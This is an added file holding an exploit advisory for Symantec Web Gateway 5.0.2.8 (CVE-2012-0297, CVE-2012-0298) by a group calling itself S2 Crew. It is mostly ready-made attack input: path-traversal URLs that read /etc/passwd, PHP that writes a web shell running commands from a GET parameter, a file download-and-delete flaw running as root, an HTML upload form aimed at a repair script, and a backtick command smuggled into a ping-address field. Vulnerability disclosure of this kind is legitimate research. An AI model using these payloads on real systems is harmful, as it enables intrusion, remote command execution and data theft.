@@ -1,0 +1,58 @@
+Software: Symantec Web Gateway
+Current Software Version: 5.0.2.8
+Product homepage: www.symantec.com
+Author: S2 Crew [Hungary]
+CVE: CVE-2012-0297, CVE-2012-0298, ???
+
+File include:
+        https://192.168.82.207/spywall/previewProxyError.php?err=../../../../../../../../etc/passwd
+
+File include and OS command execution:
+        http://192.168.82.207/spywall/releasenotes.php?relfile=../../../../../../etc/passwd
+        You can execute OS commands just include the error_log:
+        /usr/local/apache2/logs/
+        -rw-r--r--   1 root   root  5925 Nov 15 07:25 access_log
+        -rw-r--r--   1 root   root  3460 Nov 15 07:21 error_log
+
+        Make a connection to port 80:
+        <?php
+        $f = fopen('/var/www/html/spywall/cleaner/cmd.php','w');
+        $cmd = "<?php system(\$_GET['cmd']); ?>";
+        fputs($f,$cmd);
+        fclose($f);
+		print "Shell creation done<br>";
+        ?>
+
+Arbitary file download and delete:
+        https://192.168.82.207/spywall/download_file.php?d=/tmp/addroutelog&name=addroutelog
+	d parameter: the complete filename 
+        After the download process application removes the original file with root access! :)
+
+        Command execution methods:
+        1.Method
+        Download and delete the /var/www/html/ciu/.htaccess file.
+        After it you can access the ciu interface on web.
+        There is an upload script: /ciu/uploadFile.php
+	User can control the filename and the upload location:
+        $_FILES['uploadFile'];
+        $_POST['uploadLocation'];
+
+        2.Method
+        <form action="https://192.168.82.192/ciu/remoteRepairs.php" method="POST" enctype="multipart/form-data">
+        <input type="file" name="uploadFile">
+        <input type="text" name="action" value="upload">
+        <input type="text" name="uploadLocation" value="/var/www/html/spywall/cleaner/">
+        <input type="hidden" name="configuration" value="test">
+        <input type="submit" value="upload!">
+        </form>
+	
+	The "/var/www/html/spywall/cleaner" is writeable by www-data.
+
+Command execution after authentication:
+
+        http://192.168.82.207/spywall/adminConfig.php (this is deprecated config file, it should be remove)
+
+        From the modified POST message:
+        Content-Disposition: form-data; name="pingaddress"
+        127.0.0.1`whoami>/tmp/1234.txt`
+
